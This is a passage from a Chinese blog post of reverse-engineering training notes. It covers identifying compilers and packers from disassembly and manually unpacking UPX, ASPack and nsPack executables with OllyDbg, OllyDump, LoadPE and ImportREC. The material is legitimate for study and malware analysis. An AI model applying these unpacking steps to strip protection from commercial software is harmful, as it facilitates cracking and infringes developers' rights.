class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">004014EC &gt; $ /EB 10         jmp short 吾爱破解.004014FE</span><br><span class="line">004014EE     |66            db 66                                    ;  CHAR &#x27;f&#x27;</span><br><span class="line">004014EF     |62            db 62                                    ;  CHAR &#x27;b&#x27;</span><br><span class="line">004014F0     |3A            db 3A                                    ;  CHAR &#x27;:&#x27;</span><br><span class="line">004014F1     |43            db 43                                    ;  CHAR &#x27;C&#x27;</span><br><span class="line">004014F2     |2B            db 2B                                    ;  CHAR &#x27;+&#x27;</span><br><span class="line">004014F3     |2B            db 2B                                    ;  CHAR &#x27;+&#x27;</span><br><span class="line">004014F4     |48            db 48                                    ;  CHAR &#x27;H&#x27;</span><br><span class="line">004014F5     |4F            db 4F                                    ;  CHAR &#x27;O&#x27;</span><br><span class="line">004014F6     |4F            db 4F                                    ;  CHAR &#x27;O&#x27;</span><br><span class="line">004014F7     |4B            db 4B                                    ;  CHAR &#x27;K&#x27;</span><br><span class="line">004014F8     |90            nop</span><br><span class="line">004014F9     |E9            db E9</span><br><span class="line">004014FA   . |ACB04C00      dd offset 吾爱破解.___CPPdebugHook</span><br><span class="line">004014FE   &gt; \A1 9FB04C00   mov eax,dword ptr ds:[0x4CB09F]</span><br><span class="line">00401503   .  C1E0 02       shl eax,0x2</span><br><span class="line">00401506   .  A3 A3B04C00   mov dword ptr ds:[0x4CB0A3],eax</span><br><span class="line">0040150B   .  52            push edx                                 ;  吾爱破解.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0040150C   .  6A 00         push 0x0                                 ; /pModule = NULL</span><br><span class="line">0040150E   .  E8 578F0C00   call &lt;jmp.&amp;KERNEL32.GetModuleHandleA&gt;    ; \GetModuleHandleA</span><br></pre></td></tr></table></figure><h2 id="1-6-ASM"><a href="#1-6-ASM" class="headerlink" title="1.6 ASM"></a>1.6 ASM</h2><img src="/posts/e2d652c5/ASM.png" class="" title="ASM"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040108B &gt;/$  6A 00            push 0x0                                 ; /pModule = NULL</span><br><span class="line">0040108D  |.  E8 4A000000      call &lt;jmp.&amp;kernel32.GetModuleHandleA&gt;    ; \GetModuleHandleA</span><br></pre></td></tr></table></figure><p>ASM特点：用汇编编写的程序都非常小，基本很少遇到，但它可用于改变自身代码，某些病毒就是利用多态和变形的特点隐藏自身。具体可见《OD使用教程》中的多态和变形。</p><h2 id="1-7-NET"><a href="#1-7-NET" class="headerlink" title="1.7 .NET"></a>1.7 .NET</h2><img src="/posts/e2d652c5/NET.png" class="" title="NET"><p>.NET编译的程序放在OD调试会出现错误，推荐使用专门的net反编译工具。 </p><img src="/posts/e2d652c5/NET_OD.png" class="" title="NET_OD"><h2 id="1-8-AutoIt"><a href="#1-8-AutoIt" class="headerlink" title="1.8 AutoIt"></a>1.8 AutoIt</h2><img src="/posts/e2d652c5/AutoIt.png" class="" title="AutoIt"><p>在OD中文搜索引擎可以看到它是用AutoIt v3编译的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">中文搜索引擎, 条目 504</span><br><span class="line"> 地址=0014A9F1</span><br><span class="line"> 反汇编=push 吾爱破解.001E26A8</span><br><span class="line"> 文本字符串=AutoIt v3 GUI</span><br></pre></td></tr></table></figure><h2 id="1-9-PB"><a href="#1-9-PB" class="headerlink" title="1.9 PB"></a>1.9 PB</h2><img src="/posts/e2d652c5/PB.png" class="" title="PB"><p>PB可能也是跟易语言的独立编译一样，调用VC的链接程序编译，所以才显示VC6。但它还另加了两个库：<code>libjcc.dll</code>和<code>pbvm90.dll</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Executable modules</span><br><span class="line">基址       大小       入口       名称       文件版本          路径</span><br><span class="line">009E0000   0007C000   00A10640   libjcc     4.2.5.06          F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\libjcc.dll</span><br><span class="line">10000000   0000B000   10001B30   吾爱破解       1,0,0,1           F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\吾爱破解论坛学习脱壳实例_PB.exe</span><br><span class="line">10B00000   003F3000   10DB9000   pbvm90     9.0.3.8784        F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\pbvm90.dll</span><br></pre></td></tr></table></figure><h2 id="1-10-QT"><a href="#1-10-QT" class="headerlink" title="1.10 QT"></a>1.10 QT</h2><img src="/posts/e2d652c5/QT.png" class="" title="QT"><p>查壳可看到QT编译，并且OD的<code>E</code>模块也看到了有关QT的库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Executable modules</span><br><span class="line">基址       大小       入口       名称       文件版本          路径</span><br><span class="line">00400000   0000D000   004014C0   52pojie    0.0.0.0           F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\52pojie.exe</span><br><span class="line">01090000   00633000   01091420   Qt5Widge   5.4.1.0           F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\Qt5Widgets.dll</span><br><span class="line">016D0000   002AD000   016D1420   icuin53                      F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\icuin53.dll</span><br><span class="line">61940000   00505000   61941420   Qt5Gui     5.4.1.0           F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\Qt5Gui.dll</span><br><span class="line">64940000   00014000   64941420   libwinpt   1, 0, 0, 0        F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\libwinpthread-1.dll</span><br><span class="line">66500000   01499000   66501420   icudt53                      F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\icudt53.dll</span><br><span class="line">68430000   0003F000   68462D70   glu32      10.0.19041.1288   C:\Windows\SysWOW64\glu32.dll</span><br><span class="line">68880000   004A6000   68881420   Qt5Core    5.4.1.0           F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\Qt5Core.dll</span><br><span class="line">68F80000   001B3000   68F81420   icuuc53                      F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\icuuc53.dll</span><br><span class="line">694A0000   00103000   69573D60   opengl32   10.0.19041.1081   C:\Windows\SysWOW64\opengl32.dll</span><br><span class="line">6C640000   0009F000   6C678870   apphelp    10.0.19041.1288   C:\Windows\SysWOW64\apphelp.dll</span><br><span class="line">6E940000   00024000   6E941420   libgcc_s                     F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\libgcc_s_dw2-1.dll</span><br><span class="line">6FC40000   00101000   6FC41420   libstdc+                     F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\libstdc++-6.dll</span><br></pre></td></tr></table></figure><h2 id="1-11-VB"><a href="#1-11-VB" class="headerlink" title="1.11 VB"></a>1.11 VB</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040129A  - FF25 AC104000   jmp dword ptr ds:[&lt;&amp;msvbvm60.#ThunRTMain_100&gt;]            ; msvbvm60.ThunRTMain</span><br><span class="line">004012A0 &gt;  68 582E4000     push dumped_.00402E58</span><br><span class="line">004012A5    E8 F0FFFFFF     call &lt;jmp.&amp;msvbvm60.#ThunRTMain_100&gt;</span><br></pre></td></tr></table></figure><h1 id="2-如何判断是否加壳"><a href="#2-如何判断是否加壳" class="headerlink" title="2. 如何判断是否加壳"></a>2. 如何判断是否加壳</h1><ol><li>通过查壳工具中内置各种壳的十六进制特征码进行对比查壳</li><li>通过程序入口特征与区段信息来判断</li></ol><h1 id="3-程序加的是什么壳"><a href="#3-程序加的是什么壳" class="headerlink" title="3. 程序加的是什么壳"></a>3. 程序加的是什么壳</h1><p>未加壳、压缩壳、传统加密壳、代码虚拟化保护、.Net程序加密…</p><h2 id="3-1-压缩壳"><a href="#3-1-压缩壳" class="headerlink" title="3.1 压缩壳"></a>3.1 压缩壳</h2><p>尽量减少可执行文件的大小。</p><h3 id="3-1-1-ASPacK"><a href="#3-1-1-ASPacK" class="headerlink" title="3.1.1 ASPacK"></a>3.1.1 ASPacK</h3><img src="/posts/e2d652c5/ASPacK.png" class="" title="ASPacK"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00803001 &gt;  60              pushad</span><br></pre></td></tr></table></figure><p>看到<code>m</code>模块，除了最基本VS编译特点的区段，ASPacK壳还加了<code>.aspack</code>与<code>.adata</code>模块，这两个模块都可以在加壳时自定义名字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Memory map</span><br><span class="line">地址       大小       属主       区段       包含                         类型   访问     初始访问  已映射为</span><br><span class="line">007B0000   00001000   吾爱破解                  PE 文件头                     Imag   R         RWE</span><br><span class="line">007B1000   00031000   吾爱破解       .text      代码                         Imag   R       RWE</span><br><span class="line">007E2000   0000D000   吾爱破解       .rdata     数据                          Imag   R       RWE</span><br><span class="line">007EF000   00007000   吾爱破解       .data                                   Imag   R         RWE</span><br><span class="line">007F6000   00004000   吾爱破解       .rsrc      资源                          Imag   R       RWE</span><br><span class="line">007FA000   00009000   吾爱破解       .reloc                                  Imag   R         RWE</span><br><span class="line">00803000   00003000   吾爱破解       .aspack    SFX,输入表                    Imag   R         RWE</span><br><span class="line">00806000   00001000   吾爱破解       .adata                                  Imag   R         RWE</span><br></pre></td></tr></table></figure><h3 id="3-1-2-UPX"><a href="#3-1-2-UPX" class="headerlink" title="3.1.2 UPX"></a>3.1.2 UPX</h3><img src="/posts/e2d652c5/UPX.png" class="" title="UPX"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00287170 &gt; $  60            pushad</span><br></pre></td></tr></table></figure><h2 id="3-2-加密壳"><a href="#3-2-加密壳" class="headerlink" title="3.2 加密壳"></a>3.2 加密壳</h2><p>抵抗各类调试器和逆向，可能会加入大量干扰代码。</p><h3 id="3-2-1-Themida"><a href="#3-2-1-Themida" class="headerlink" title="3.2.1 Themida"></a>3.2.1 Themida</h3><img src="/posts/e2d652c5/Themida.png" class="" title="Themida"><p>从查壳工具看到它有个区段没名字，并且最后两段是随机名称。而且它与其他加壳的入口处不一样，不是<code>pushad</code>而是三个push</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00AC4000 &gt;  56              push esi                                 ; 吾爱破解.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00AC4001    50              push eax</span><br><span class="line">00AC4002    53              push ebx</span><br><span class="line">00AC4003    E8 01000000     call 吾爱破解.00AC4009</span><br><span class="line">00AC4008    CC              int3</span><br></pre></td></tr></table></figure><p>但F8运行一段后也是可以发现有<code>pushad</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">008BC76D    89E8            mov eax,ebp</span><br><span class="line">008BC76F    89E2            mov edx,esp</span><br><span class="line">008BC771    60              pushad</span><br><span class="line">008BC772    E8 00000000     call 吾爱破解.008BC777</span><br></pre></td></tr></table></figure><h3 id="3-2-2-VMProtect"><a href="#3-2-2-VMProtect" class="headerlink" title="3.2.2 VMProtect"></a>3.2.2 VMProtect</h3><img src="/posts/e2d652c5/VMProtect.png" class="" title="VMProtect"><p>可看VMProtect有很多个段，一些段的首字节显示<code>ZERO SIZE</code>。载入OD代码看起来也很乱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">007433CC    E8 F6EFFCFF     call 吾爱破解.007123C7</span><br><span class="line">007433D1    48              dec eax</span><br><span class="line">007433D2    DE1F            ficomp word ptr ds:[edi]</span><br><span class="line">007433D4    ff5e 43         call far fword ptr ds:[esi+0x43]</span><br><span class="line">007433D7    29F0            sub eax,esi</span><br><span class="line">007433D9    3950 3F         cmp dword ptr ds:[eax+0x3F],edx          ; 吾爱破解.00610000</span><br><span class="line">007433DC    16              push ss</span><br><span class="line">007433DD    17              pop ss</span><br><span class="line">007433DE    F8              clc</span><br></pre></td></tr></table></figure><p>进入第一个函数可以看到类似于加密的<code>pushfd</code>标志吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">007123C7    9C              pushfd</span><br><span class="line">007123C8    9C              pushfd</span><br><span class="line">007123C9    C74424 08 1F660&gt;mov dword ptr ss:[esp+0x8],0xA00A661F</span><br><span class="line">007123D1    9C              pushfd</span><br><span class="line">007123D2    E9 B58D0000     jmp 吾爱破解.0071B18C</span><br></pre></td></tr></table></figure><h3 id="3-2-3-Shielden"><a href="#3-2-3-Shielden" class="headerlink" title="3.2.3 Shielden"></a>3.2.3 Shielden</h3><img src="/posts/e2d652c5/Shielden.png" class="" title="Shielden"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0050B119 &gt; $ /EB 08         jmp short 吾爱破解.0050B123</span><br><span class="line">0050B11B     |00            db 00</span><br><span class="line">0050B11C     |C8            db C8</span><br><span class="line">0050B11D     |10            db 10</span><br><span class="line">0050B11E     |00            db 00</span><br><span class="line">0050B11F     |00            db 00</span><br><span class="line">0050B120     |00            db 00</span><br><span class="line">0050B121     |00            db 00</span><br><span class="line">0050B122     |00            db 00</span><br><span class="line">0050B123   &gt;^\E9 E5F2FFFF   jmp 吾爱破解.0050A40D</span><br><span class="line">0050B128   .  1978 5B       sbb dword ptr ds:[eax+0x5B],edi          ;  吾爱破解.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0050B12B   &gt;  0f93c3        setae bl</span><br><span class="line">0050B12E   .  FEC1          inc cl</span><br><span class="line">0050B130   .  8BDE          mov ebx,esi                              ;  吾爱破解.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0050B132   .  60            pushad</span><br><span class="line">0050B133   .  F6DF          neg bh</span><br></pre></td></tr></table></figure><p>F8走几下，也能看到明显的Shielden加壳特征。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0050A40D   &gt; /E8 1C000000   call 吾爱破解.0050A42E                       ;  PUSH ASCII &quot;Safengine Shielden v2.3.6.0&quot;</span><br><span class="line">0050A412   . |53 61 66 65 6&gt;ascii &quot;Safengine Shield&quot;</span><br><span class="line">0050A422   . |65 6E 20 76 3&gt;ascii &quot;en v2.3.6.0&quot;,0</span><br><span class="line">0050A42E   &gt; |9C            pushfd</span><br></pre></td></tr></table></figure><h1 id="4-脱壳详解"><a href="#4-脱壳详解" class="headerlink" title="4. 脱壳详解"></a>4. 脱壳详解</h1><p>以下脱壳都是用吾爱专用虚拟机进行操作，因为Win7/8/10(以后仅称Win10)脱壳太不友好，导致各种各样的问题出现。比如Win10系统下LoadPE只显示系统进程、脱壳后的程序无法正常运行(原因是ASLR基地址随机化脱壳插件获取的地址不对)，这些问题在XP系统都可以得到解决。</p><p>脱壳后的程序回到Win10运行不了的问题，也是因为ASLR基地址随机化。ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</p><p>在XP虚拟机用LoadPE和Scylla结合脱壳后的程序，移到Win10就打不开的情况(点击后加载了一下主程序却没出来)。OD载入看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00F42CA0    8BFF            mov edi,edi                              ; dumped_S.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00F42CA2    55              push ebp</span><br><span class="line">00F42CA3    8BEC            mov ebp,esp</span><br><span class="line">00F42CA5    83EC 10         sub esp,0x10</span><br><span class="line">00F42CA8    A1 B0074400     mov eax,dword ptr ds:[0x4407B0]</span><br></pre></td></tr></table></figure><p>下面是XP系统同一代码位置的情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00422CA0    8BFF            mov edi,edi</span><br><span class="line">00422CA2    55              push ebp</span><br><span class="line">00422CA3    8BEC            mov ebp,esp</span><br><span class="line">00422CA5    83EC 10         sub esp,0x10</span><br><span class="line">00422CA8    A1 B0074400     mov eax,dword ptr ds:[0x4407B0]</span><br></pre></td></tr></table></figure><p>发现第5行都是<code>4407B0</code>，肯定不对，推测在Win10下这个偏移地址为<code>F607B0</code>(这个地址还会变，因为每次载入程序地址都会随机化)。为了让程序能在Win10正常运行，只需将文件或系统的ASLR取消即可。最好不要取消系统的ASLR，涉及安全问题。</p><p>取消文件的ASLR的两种方法：</p><ol><li>打开LoadPE-&gt;PE编辑器-&gt;特征值后面三个点-&gt;将重定位已分离勾选-&gt;确定-&gt;保存-&gt;确定</li><li>打开CFF Explorer-&gt;载入文件-&gt;File Header-&gt;Click Here-&gt;将<code>relocation info stripped from file</code>勾选-&gt;OK</li></ol><p>在XP中取消再移到Win10或直接在Win10取消都行。</p><h2 id="4-1-UPX"><a href="#4-1-UPX" class="headerlink" title="4.1 UPX"></a>4.1 UPX</h2><p>做作业前推荐观看ximo脱壳基础——手脱UPX壳</p><img src="/posts/e2d652c5/hw_UPX.png" class="" title="hw_UPX"><p>用ExeinfoPE查壳可知它是UPX壳，并且可以知道区段的名字可以随意改变，所以用区段名字判断它是什么壳其实不准确。UPX脱壳非常简单，只需利用UPX脱壳工具即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">D:\CTF\tools\upx&gt;upx -d 吾爱破解培训第一课作业一.exe -o 1.exe</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2020</span><br><span class="line">UPX 3.96w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">upx: 吾爱破解培训第一课作业一.exe: CantUnpackException: file is modified/hacked/protected; take care!!!</span><br><span class="line"></span><br><span class="line">Unpacked 0 files.</span><br></pre></td></tr></table></figure><p>呃…脱壳工具好鸡肋，看了ximo的手脱UPX壳，现在4种方法都来试试吧。</p><h3 id="4-1-1-单步跟踪法"><a href="#4-1-1-单步跟踪法" class="headerlink" title="4.1.1 单步跟踪法"></a>4.1.1 单步跟踪法</h3><p>一路F8，遇到向上跳转不实现，向下跳转忽略。</p><p>遇到向上跳转时，有两种方法饶过：</p><ol><li>选中向上跳转指令的下一条指令F4(运行至光标处)</li><li>选中向上跳转指令的下一条指令F2-&gt;F9-&gt;F2(下断点-&gt;运行-&gt;取消断点)</li></ol><p>如果向上跳转的下一条指令是跳转指令或是call指令，那就在下下一条指令进行操作，以此类推。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00F87757    61              popad</span><br><span class="line">00F87758    8D4424 80       lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">00F8775C    6A 00           push 0x0</span><br><span class="line">00F8775E    39C4            cmp esp,eax</span><br><span class="line">00F87760  ^ 75 FA           jnz short 吾爱破解.00F8775C</span><br><span class="line">00F87762    83EC 80         sub esp,-0x80</span><br><span class="line">00F87765  - E9 4266FCFF     jmp 吾爱破解.00F4DDAC</span><br></pre></td></tr></table></figure><p>经过漫长的上述重复操作后，终于来到了第7行的大跳转处，大跳转在加壳程序中往往意味着OEP(注意第1行的popad，其它方法会用到)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00F4DDAC    E8 EF4E0000     call 吾爱破解.00F52CA0</span><br><span class="line">00F4DDB1  ^ E9 79FEFFFF     jmp 吾爱破解.00F4DC2F</span><br><span class="line">00F4DDB6    3B0D B007F700   cmp ecx,dword ptr ds:[0xF707B0]</span><br></pre></td></tr></table></figure><p>以上就是真正程序的起始处，结合1所学的各种语言编译后代码的特点，猜测该程序是由VS编译的。</p><h3 id="4-1-2-ESP定律"><a href="#4-1-2-ESP定律" class="headerlink" title="4.1.2 ESP定律"></a>4.1.2 ESP定律</h3><p>入口代码第1行是<code>pushad</code>，经过这一条指令后，在寄存器的ESP右键-&gt;数据窗口中跟随，来到数据窗口，选中第一个hex数据右键-&gt;断点-&gt;硬件访问-&gt;Word(或者在命令窗口输入<code>hr esp</code>回车)，F9运行，取消硬件断点，之后就按照4.1.1的方法走，一直走到OEP。</p><h3 id="4-1-3-2次内存镜像法"><a href="#4-1-3-2次内存镜像法" class="headerlink" title="4.1.3 2次内存镜像法"></a>4.1.3 2次内存镜像法</h3><p><code>M</code>模块查看内存，找到程序领空的<code>.rsrc</code>表，也就是资源表。虽然吾爱把表名改了，但还是可以在包含里看到“资源”字样，就在<code>.cn</code>处。这里注意，如果资源表是单独一个，就用2次内存镜像，如果与其他表合在一起，只用1次内存镜像即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Memory map</span><br><span class="line">地址         大小       属主           区段       包含                         类型   访问    初始访问  已映射为</span><br><span class="line">00160000   00001000   吾爱破解                  PE 文件头                     Imag   R         RWE</span><br><span class="line">00161000   00039000   吾爱破解           www.                                Imag   R         RWE</span><br><span class="line">0019A000   0001E000   吾爱破解       52pojie    SFX,代码                      Imag   R         RWE</span><br><span class="line">001B8000   00005000   吾爱破解            .cn   数据,输入表,资源               Imag   R         RWE</span><br></pre></td></tr></table></figure><p>①如果<code>.rsrc</code>单独一个节，选中<code>.rsrc</code>右键-&gt;在访问上设置中断-&gt;F9。再找一次内存，在PE文件头的下一节地址，也就是161000处下断点，运行，删除断点。</p><p>②如果<code>.rsrc</code>并不是单独一个节，只需在PE文件头的下一节地址，也就是161000处下断点，运行，删除断点。</p><p>之后按照4.1.1的方法走。</p><h3 id="4-1-4-一步直达法"><a href="#4-1-4-一步直达法" class="headerlink" title="4.1.4 一步直达法"></a>4.1.4 一步直达法</h3><p>绝大部分UPX壳和AsPack壳都可以用这种方法。载入OD后可直观看到<code>pushad</code>，既然有<code>pushad</code>那肯定有<code>popad</code>。右键-&gt;查找-&gt;命令，输入<code>popad</code>，不需要勾选整个块。之后与4.1.1同。</p><p>在虚拟机的OD找到OEP后，三种方法dump下来。</p><p>①用OllyDump插件，起始地址是<code>E</code>模块的第一行的<code>00400000</code>，大小为<code>5D000</code>，OEP的地址为<code>0041DDAC</code>，修正的是偏移地址，所以是<code>0041DDAC-00400000=1DDAC</code>，代码基址和数据基址可以在<code>M</code>模块看，代码基址是<code>3A000</code>，数据基址是<code>58000</code>。用方式1脱壳，保存为<code>ODdump1.exe</code>，可以运行，载入exeinfoPE说有不知名的壳在保护，但点一下插件Advanced Scan就可看到是由VS2008编译的。</p><img src="/posts/e2d652c5/ODdump1.jpg" class="" title="ODdump1"><p>在PEID可以直接看到是由VS2008编译的。</p><img src="/posts/e2d652c5/ODdump11.jpg" class="" title="ODdump11"><p><code>ODdump1.exe</code>载入OD后还是显示有压缩代码的存在。</p><img src="/posts/e2d652c5/ODdump12.jpg" class="" title="ODdump12"><p>那UPX壳到底有没有脱干净呢？其实只要脱壳后的程序可以正常运行，OEP入口代码为无壳代码特征，IAT解密完资源没有被压缩即可。 </p><p>②用OllyDump插件，与①完全相同，只是用方式2脱壳，保存为<code>ODdump2.exe</code>，不可运行。</p><img src="/posts/e2d652c5/ODdump2.jpg" class="" title="ODdump2"><p>③打开LoadPE，找到OD进程，右键-&gt;修复镜像大小-&gt;右键-&gt;完整转存，将正在调试的程序完整地转存下来，自动生成一个<code>dumped.exe</code>文件，不可运行，壳还没脱。<strong>注意，先别关掉OD。</strong>打开ImportREC，找到原本的程序(不是<code>dumped.exe</code>)，将OEP改为<code>1DDAC</code>-&gt;自动查找IAT-&gt;获取输入表，没有无效函数，转储到文件，选中<code>dumped.exe</code>打开，会自动生成一个<code>dumped_.exe</code>。这时，<code>dumped_.exe</code>可以运行。</p><img src="/posts/e2d652c5/dumped.jpg" class="" title="dumped"><img src="/posts/e2d652c5/dumped1.jpg" class="" title="dumped1"><img src="/posts/e2d652c5/dumped_.jpg" class="" title="dumped_"><h2 id="4-2-ASPacK"><a href="#4-2-ASPacK" class="headerlink" title="4.2 ASPacK"></a>4.2 ASPacK</h2><img src="/posts/e2d652c5/ASPacK.png" class="" title="ASPacK"><p>ASPacK壳都可以用以上4种方法。现在用单步跟踪法温故知新。F8运行到第2行主程序就出来了，也就是我们所说的“跑飞了”。所以要F7跟进去，以后同理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00430001 &gt;  60              pushad</span><br><span class="line">00430002    E8 03000000     call QQ个性网.0043000A</span><br><span class="line">00430007  - E9 EB045D45     jmp 45A004F7</span><br></pre></td></tr></table></figure><p>单步跟踪法与F7、F8结合，运行至<code>retn</code>指令后出来的就是真正程序开始的地方。</p><p>在一步直达法查找<code>popad</code>时会遇到很多个<code>popad</code>可能都不是我们需要的，在不知道哪个是我们所要的<code>popad</code>情况下，最好不要用这种方法。</p><h3 id="4-2-1-模拟跟踪法"><a href="#4-2-1-模拟跟踪法" class="headerlink" title="4.2.1 模拟跟踪法"></a>4.2.1 模拟跟踪法</h3><p>模拟跟踪法包括SFX模拟跟踪都是让OD自动查找程序OEP。</p><p><code>M</code>模块，在程序领空找到包含SFX的区段的地址。在命令窗口输入<code>tc eip &lt; 包含SFX的区段的地址</code>回车，OD会自动跟踪OEP，但这个过程可能会有点漫长。跟踪完后OD会跳到<code>C</code>模块的某条指令上，这条指令可能是OEP，也可能是将要到OEP，需要单步跟踪到达OEP。</p><h3 id="4-2-2-SFX模拟跟踪"><a href="#4-2-2-SFX模拟跟踪" class="headerlink" title="4.2.2 SFX模拟跟踪"></a>4.2.2 SFX模拟跟踪</h3><p>选项-&gt;调试设置-&gt;SFX，选块方式跟踪或字节方式跟踪，视情况而定。重载后自动跳到OEP或将要到OEP处。</p><h2 id="4-3-nsPack"><a href="#4-3-nsPack" class="headerlink" title="4.3 nsPack"></a>4.3 nsPack</h2><img src="/posts/e2d652c5/nsPack.png" class="" title="nsPack"><p>nsPack壳是北斗的壳，可以用上面6种方法手动脱壳，过程与脱ASPacK壳一样。</p><p>nsPack壳作业用①方法用PEID查壳第一行Unknown，第二行显示VS2008，程序正常运行，载入OD也正常。用②方法查壳同①，程序不能正常运行，错误提示“应用程序正常初始化(0xc0000005)失败”，这时用importREC自动查找IAT就可正常运行，载入OD正常。用③方法全部同①。</p><h2 id="4-4-FSG-2-0"><a href="#4-4-FSG-2-0" class="headerlink" title="4.4 FSG 2.0"></a>4.4 FSG 2.0</h2><img src="/posts/e2d652c5/FSG.png" class="" title="FSG"><h3 